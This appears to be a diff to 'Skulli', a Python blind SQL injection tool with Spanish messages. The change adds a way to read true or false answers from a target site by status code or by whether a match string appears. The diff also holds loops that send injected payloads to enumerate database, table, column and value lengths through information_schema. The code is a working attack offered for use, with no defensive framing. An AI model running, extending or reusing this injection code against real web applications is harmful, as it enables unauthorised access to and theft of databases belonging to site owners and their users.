@@ -98,8 +98,28 @@ class Skulli:
             print('Ocurrio un error a la hora de la inyeccion, puede que no tenga permisos para leer esa base de datos/tabla/columna.')
             sys.exit(1)
 
+    def condition_of_request(self, match):
+        if match.isdigit():
+            return 'status_code'
+        else:
+            if self.method.lower() == 'post':
+                test = requests.post(self.url,data=self.old_data,headers=self.headers)
+                
+                if match in test.text:
+                    return 'in'
+                else:
+                    return 'not in'
+            else:
+                test = requests.get(self.url,data=self.old_data,headers=self.headers)
+                
+                if match in test.text:
+                    return 'in'
+                else:
+                    return 'not in'
+
     def get_databases_len(self):
         ln = None
+        condition = self.condition_of_request(self.match)
 
         for i in range(1,200):
             length = f"' or length((select group_concat(schema_name) from information_schema.schemata))={i}-- -"
@@ -110,9 +130,19 @@ class Skulli:
             else:
                  r = requests.get(self.url, data=self.data, headers=self.headers)
             self.data[self.skll] = self.old_data
-            if self.match not in r.text:
-                ln = i
-                break
+            if condition == 'status_code':
+                if r.status_code != self.match:
+                    ln = i
+                    break
+            else:
+                if condition == 'not in':
+                    if self.match not in r.text:
+                        ln = i
+                        break
+                else:
+                    if self.match in r.text:
+                        ln = i
+                        break
         self.data[self.skll] = self.old_data
         self.length_value(ln)
         return ln
@@ -144,6 +174,7 @@ class Skulli:
 
     def get_tables_len(self, db):
         ln = None
+        condition = self.condition_of_request(self.match)
 
         for i in range(1,200):
             length = f"' or length((select group_concat(table_name) from information_schema.tables where table_schema='{db}'))={i}-- -"
@@ -154,9 +185,19 @@ class Skulli:
             else:
                  r = requests.get(self.url, data=self.data, headers=self.headers)
             self.data[self.skll] = self.old_data
-            if self.match not in r.text:
-                ln = i
-                break
+            if condition == 'status_code':
+                if r.status_code != self.match:
+                    ln = i
+                    break
+            else:
+                if condition == 'not in':
+                    if self.match not in r.text:
+                        ln = i
+                        break
+                else:
+                    if self.match in r.text:
+                        ln = i
+                        break
         self.data[self.skll] = self.old_data
         self.length_value(ln)
         return ln
@@ -188,6 +229,7 @@ class Skulli:
 
     def get_columns_len(self, db, table):
         ln = None
+        condition = self.condition_of_request(self.match)
 
         for i in range(1,200):
             length = f"' or length((select group_concat(column_name) from information_schema.columns where table_schema=\'{db}\' and table_name=\'{table}\'))={i}-- -"
@@ -198,9 +240,19 @@ class Skulli:
             else:
                  r = requests.get(self.url, data=self.data, headers=self.headers)
             self.data[self.skll] = self.old_data
-            if self.match not in r.text:
-                ln = i
-                break
+            if condition == 'status_code':
+                if r.status_code != self.match:
+                    ln = i
+                    break
+            else:
+                if condition == 'not in':
+                    if self.match not in r.text:
+                        ln = i
+                        break
+                else:
+                    if self.match in r.text:
+                        ln = i
+                        break
         self.data[self.skll] = self.old_data
         
         self.length_value(ln)
@@ -233,6 +285,7 @@ class Skulli:
 
     def get_values_len(self, db, table, columns):
         ln = None
+        condition = self.condition_of_request(self.match)
 
         for i in range(1,300):
             length = f"' or char_length((select group_concat({columns}) from {db}.{table}))={i}-- -"
@@ -243,9 +296,19 @@ class Skulli:
             else:
                  r = requests.get(self.url, data=self.data, headers=self.headers)
             self.data[self.skll] = self.old_data
-            if self.match not in r.text:
-                ln = i
-                break
+            if condition == 'status_code':
+                if r.status_code != self.match:
+                    ln = i
+                    break
+            else:
+                if condition == 'not in':
+                    if self.match not in r.text:
+                        ln = i
+                        break
+                else:
+                    if self.match in r.text:
+                        ln = i
+                        break
         self.data[self.skll] = self.old_data
         
         self.length_value(ln)
